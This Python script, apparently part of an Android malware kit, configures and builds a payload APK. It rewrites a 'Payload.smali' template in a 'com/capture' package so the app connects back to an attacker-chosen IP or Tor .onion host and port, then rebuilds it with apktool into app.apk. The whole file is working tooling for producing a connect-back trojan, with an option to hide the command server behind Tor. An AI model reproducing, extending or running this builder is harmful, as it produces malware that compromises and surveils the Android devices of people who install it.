import argparse
import os
import datetime

def display_logo():
    logo = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠒⠒⠒⠒⠢⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⠞⠁⠀⠚⠋⢀⣠⡤⠤⠤⢤⣟⠲⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡞⢩⡖⠛⡾⠁⠀⠀⠀⡠⠊⠁⠀⠀⢰⣶⣶⡄⠙⢮⡙⢗⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡅⢻⡀⡼⠁⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠻⡈⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠳⣄⠉⠁⠀⠀⠀⢸⠁⠀⣀⠤⠖⠊⠉⠉⠉⠉⠒⢦⡀⠃⢸⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⢸⡴⠋⠀⠀⢀⠀⠀⠀⠀⡀⠀⠀⠙⢿⡀⢣⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⢀⡼⠁⠀⢠⡇⠀⣿⠛⢿⡄⠀⣇⣆⠀⡆⠀⢹⣼⡄⠀⠀⠀⠀coded by nous
⠀⠀⠀⠀⠀⢸⡇⠀⠀⣸⠃⢢⣷⣸⡇⣀⢿⠀⢸⣇⡀⣹⣼⡀⠰⠀⢘⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⢀⡏⢀⠾⠴⢟⡛⣟⠛⠀⣸⠙⠈⣷⡟⠺⢿⣾⠾⣿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠁⠀⢸⢳⢾⡀⠰⣹⣿⠏⠀⠀⠀⠀⠀⢻⣿⣷⢬⣿⣴⠿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡜⠀⠀⡞⠻⡇⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⣼⠏⠙⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⠁⢀⣼⣆⠀⣙⣦⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠀⣰⢻⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡇⢀⠎⠘⠀⠑⠏⠋⠙⢤⡀⠀⠀⠠⠦⠀⢀⡤⢾⠃⢸⠀⠀⠀⠙⣆⠀⠀⠀
⠀⠀⠀⠘⣇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢶⣶⣶⠚⠉⠀⢸⠀⢠⠀⠀⠀⠙⣆⠀⠀⠀
⠀⠀⢀⡾⠛⡇⠀⠀⠀⠀⠀⠀⠀⣠⠔⠊⢁⣿⣿⠓⠠⣄⡈⡀⢸⠀⠀⠀⠀⢸⠀⠀⠀
⠀⢀⡞⠁⠀⠘⠢⡀⠀⠀⣠⡔⠋⠀⡠⠀⢸⠉⠁⠀⠠⠀⠉⠃⢸⠀⠀⢀⣴⡁⠀⠀⠀
⠀⡼⠀⠀⠀⠀⠘⠈⠁⠉⠉⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠐⠄⡇⢸⠉⠉⠁⠀⢱⡄⠀⠀
⠀⣼⠁⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⢠⢦⠀⠀⠀⣧⠃⠀⠀⠀⠇⠀⢳⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠘⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡇⠀
⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡇⠀
⠀⢸⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀
⠀⠈⡆⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇

░░   ░           ░       ░  ░ """
    print(logo)

def neon(texto):
    return f"\033[1;35m{texto}\033[0m" 

def log(mensagem):
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(neon(f"[{agora}] {mensagem}"))

def modificar_payload(host, porta, usar_tor):
    caminho_base = "templates/app/smali/com/capture/Payload.smali"
    if usar_tor:
        caminho_base = "templates/app-tor/smali/com/capture/Payload.smali"

    with open(caminho_base, "r") as arquivo:
        linhas = arquivo.readlines()

    for i, linha in enumerate(linhas):
        if 'public static final URL' in linha:
            linhas[i] = f'.field public static final URL:Ljava/lang/String; = "ZZZZtcp://{host}:{porta}"\n'
            break

    with open(caminho_base, "w") as arquivo:
        arquivo.writelines(linhas)

    log(f"Configuração salva em: {caminho_base}")

def compilar_apk(usar_tor):
    caminho = "templates/app" if not usar_tor else "templates/app-tor"
    log(f"Compilando APK no caminho: {caminho}...")

    comando = f"apktool b {caminho}"
    resultado = os.system(comando)

    caminho_dist = f"{caminho}/dist/*.apk"
    destino = "app.apk"
    os.system(f"mv {caminho_dist} {destino}")

    if resultado == 0:
        log(f"APK compilado com sucesso e movido para {destino}!")
    else:
        log("Erro ao compilar o APK!")

def mostrar_ajuda():
    help_text = """
    ═══════════════════════════════════════
    Opções disponíveis:

    --host        Novo endereço IP ou host .onion (Ex: 192.168.0.1 ou exemplo.onion)
    --porta       Nova porta (Ex: 8080)
    --tor         Usar Tor? (true/false) - Para usar hosts .onion, defina como true

    Descrição:
    Este script modifica o arquivo Payload.smali com as novas configurações de host e porta.
    Em seguida, compila o APK com as modificações feitas.

    Exemplo:
    python script.py --host 192.168.0.1 --porta 8080 --tor false
    ou
    python script.py --host exemplo.onion --porta 8080 --tor true

    ═══════════════════════════════════════
    """
    print(help_text)

def main():
    parser = argparse.ArgumentParser(description="Configurar host e porta no APK")
    parser.add_argument("--host", required=True, help="Novo endereço IP ou host .onion")
    parser.add_argument("--porta", required=True, help="Nova porta")
    parser.add_argument("--tor", choices=["true", "false"], required=True, help="Usar Tor? (true/false) - Para usar hosts .onion, defina como true")

    args = parser.parse_args()

    if len(vars(args)) == 0:
        mostrar_ajuda()
        return

    usar_tor = args.tor.lower() == "true"

    log("Iniciando configuração...")
    modificar_payload(args.host, args.porta, usar_tor)
    compilar_apk(usar_tor)

if __name__ == "__main__":
    display_logo()
    main()
